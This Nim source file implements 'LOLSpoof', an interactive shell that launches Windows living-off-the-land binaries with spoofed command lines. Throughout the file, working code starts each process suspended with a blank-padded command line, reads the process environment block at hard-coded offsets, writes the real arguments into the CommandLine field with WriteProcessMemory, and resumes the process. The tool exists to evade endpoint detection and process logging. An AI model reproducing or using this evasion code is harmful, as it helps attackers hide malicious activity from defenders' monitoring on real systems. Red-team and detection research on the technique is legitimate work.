import os
import winim
import rdstdin
import strutils
import strformat


const banner = """
 _     _____ _      _____                    __ 
| |   |  _  | |    /  ___|                  / _|
| |   | | | | |    \ `--. _ __   ___   ___ | |_ 
| |   | | | | |     `--. \ '_ \ / _ \ / _ \|  _|
| |___\ \_/ / |____/\__/ / |_) | (_) | (_) | |  
\_____/\___/\_____/\____/| .__/ \___/ \___/|_|  
                         | |                    
                         |_|                    

    An interactive shell to spoof some LOLBins
    try !help
"""

const help = """    

    !exit    -> Exit 
    !cls     -> Clear the screen
    !help    -> This help message
"""

const prompt = "[LOLSpoof] > "


proc onexit() {.noconv.} =
    quit(0)


proc executeSpoofedLolbin(realCmdlineN: string): bool =

    # Create spoodef cmdline
    var binary = realCmdlineN.split(" ")[0]
    var argsLen = len(realCmdlineN) - len(binary)
    var spoofedCmdlineN = binary & ' '.repeat(argsLen)
    var realCmdline = newWideCString(realCmdlineN)
    var spoofedCmdline = newWideCString(spoofedCmdlineN)

    # Create suspended process
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    if CreateProcess(
        NULL,
        spoofedCmdline,
        NULL,
        NULL, 
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    ) != TRUE:
        return false

    # Get remote PEB address
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        pi.hProcess,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        return false
    
    # Get RTL_USER_PROCESS_PARAMETERS address
    let peb = bi.PebBaseAddress
    let processParametersOffset = cast[int](peb) + 0x20
    var processParametersAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](processParametersOffset), addr processParametersAddress, 8, NULL) != TRUE:
        return false

    # Get CommandLine member address
    var cmdLineOffset = cast[int](processParametersAddress) + 0x70 + 0x8
    var cmdLineAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](cmdLineOffset), addr cmdLineAddress, 8, NULL) != TRUE:
        return false
    
    # Change command line
    if WriteProcessMemory(
        pi.hProcess,
        cast[LPVOID](cmdLineAddress),
        cast[LPCVOID](realCmdline),
        len(realCmdline) * 2,
        NULL
    ) != TRUE:
        return false

    # Resume process
    ResumeThread(pi.hThread)
    WaitForSingleObject(pi.hThread, INFINITE)
    return true


proc handleSpecialCommand(cmd: string) =
    if cmd == "!exit":
        onexit()
    elif cmd == "!cls":
        discard execShellCmd("cls")
    elif cmd == "!help":
        echo help
    else:
        echo fmt"Could not parse command: {cmd}"


when isMainModule:
    # Handle Ctrl+C
    setControlCHook(onexit)
    # Print help
    echo banner
    while true:
        # Get and parse command
        var cmdline = readLineFromStdin(prompt)
        cmdline = cmdline.strip(trailing=false)
        if cmdline == "":
            continue 
        # Handle special command  
        if cmdline.startsWith("!"):
            handleSpecialCommand(cmdline) 
            continue    
        var cmdlineSeq = cmdline.split(" ")
        # Find LOLBin and reconstruct commandline
        var binary = findExe(cmdlineSeq[0])
        if binary == "":
            echo fmt"Could not find binary: {cmdlineSeq[0]}"
            continue
        cmdlineSeq[0] = binary
        cmdline = join(cmdlineSeq, " ")
        # Fire in the hole !
        if not executeSpoofedLolbin(cmdline):
            echo fmt"Could not spoof binary: {cmdlineSeq[0]}"


